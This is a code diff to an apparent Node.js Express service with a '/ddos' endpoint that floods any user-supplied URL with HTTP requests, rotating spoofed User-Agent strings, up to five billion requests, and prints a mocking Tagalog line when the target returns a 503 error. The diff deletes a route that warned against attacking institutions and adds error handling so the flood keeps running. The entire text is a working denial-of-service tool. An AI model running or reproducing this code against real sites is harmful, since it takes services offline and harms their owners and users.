@@ -17,10 +17,6 @@ const userAgents = [
     'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413'
 ];
 
-app.get('/', (req, res) => {
-    res.send('Paalala:Huwag atakihin ang mga pampublikong o pampribadong institusyon. Mangyaring mag-ingat sa paggamit ng DDoS tool.');
-});
-
 app.get('/ddos', async (req, res) => {
     const { url } = req.query;
 
@@ -29,32 +25,39 @@ app.get('/ddos', async (req, res) => {
     }
 
     let requestCount = 0;
-    const maxRequests = 500000000;
-    const requestsPerSecond = 50000;
+    const maxRequests = 5000000000;
+    const requestsPerSecond = 1000;
 
     const attack = () => {
-        if (requestCount >= maxRequests) {
-            console.log('Max requests reached.');
-            return;
+        try {
+            if (requestCount >= maxRequests) {
+                console.log('Max requests reached.');
+                return;
+            }
+
+            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+            const headers = { 'User-Agent': userAgent };
+
+            axios.get(url, { headers })
+                .then((response) => {
+                    if (response.status === 503) {
+                        console.log("BOOM BAGSAK ANG GAGO HAHAHA ðŸ¤£ðŸ¤£");
+                    } else {
+                        console.log(`Status Code: ${response.status}`);
+                    }
+                    requestCount++;
+                })
+                .catch((error) => {
+                    console.log("Error: " + error.message);
+                });
+
+            if (requestCount < maxRequests) {
+                setTimeout(attack, 1000 / requestsPerSecond);
+            }
+        } catch (error) {
+            console.log("Error: " + error.message);
+            setTimeout(attack, 1000 / requestsPerSecond);
         }
-
-        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-        const headers = { 'User-Agent': userAgent };
-
-        axios.get(url, { headers })
-            .then((response) => {
-                if (response.status === 503) {
-                    console.log("BOOM BAGSAK ANG GAGO HAHAHA ðŸ¤£ðŸ¤£");
-                } else {
-                    console.log(`Status Code: ${response.status}`);
-                }
-                requestCount++;
-            })
-            .catch((error) => {
-                console.log("Error: " + error.message);
-            });
-
-        setTimeout(attack, 1000 / requestsPerSecond);
     };
 
     attack();
